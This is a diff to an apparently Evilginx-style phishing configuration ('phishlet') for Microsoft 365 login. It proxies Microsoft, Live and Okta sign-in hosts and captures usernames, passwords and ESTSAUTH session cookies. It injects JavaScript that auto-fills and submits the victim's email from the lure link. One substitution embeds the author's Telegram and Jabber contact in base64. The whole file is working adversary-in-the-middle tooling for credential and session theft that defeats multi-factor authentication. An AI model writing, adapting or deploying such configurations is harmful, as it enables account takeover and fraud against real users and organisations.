@@ -1,37 +1,86 @@
 name: 'o365'
-author: '@jamescullum'
+author: '@456478'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  # The lines below are needed if your target organization utilizes ADFS.
-  # If they do, you need to uncomment all following lines that contain <...>
-  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
-  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
-  #    <insert-adfs-subdomain> = adfs
-  #    <insert-adfs-host> = example.com
-  #    <insert-adfs-subdomain-and-host> = adfs.example.com
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  # Uncomment and fill in if your target organization utilizes ADFS
-  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'if(src){return "VGhpcyBwaGlzaGxldCB3YXMgY3JlYXRlZCBieSBANDU2NDc4IC8gQHRvbWthYmVs"}', replace: 'if(src){return "WW91IGNhbiBjb250YWN0IG1lIG9uIFRlbGVncmFtOiBAdG9ta2FiZWwgYW5kIEphYmJlcjogNDU2NDc4QHhtcHAuc2c="}', mimes: ["application/x-javascript"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  ##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx']
+    # Cookies below aren't strictly necessary, but are marked as session tokens by MS and may possibly increase the lifespan of cookies.
   - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['ESTSSC', 'ESTSAUTHLIGHT', 'stsservicecookie', 'x-ms-gateway-slice']
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+auth_urls:
+  - "/kmsi*"
+  - "/ppsecure/post.srf*"
+
 credentials:
   username:
-    key: '(login|UserName)'
-    search: '(.*)'
-    type: 'post'
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
   password:
-    key: '(passwd|Password)'
-    search: '(.*)'
-    type: 'post'
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: (login|UserName|username|email|account)
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+
 login:
-  domain: 'login.microsoftonline.com'
-  path: '/'
+  domain: "login.microsoftonline.com"
+  path: "/"
+
+# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*"]
+    script: |
+      window.addEventListener("load", () => {
+        if (window.location.hash.length == 0) {
+          return
+        }
+        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
+        waitForElm("#i0116").then((elm) => {
+          elm.focus();
+          elm.value = window.location.hash.slice(1);
+          const submBtn = document.querySelector("#idSIButton9");
+          submBtn.focus();
+          submBtn.click();
+        });
+      });
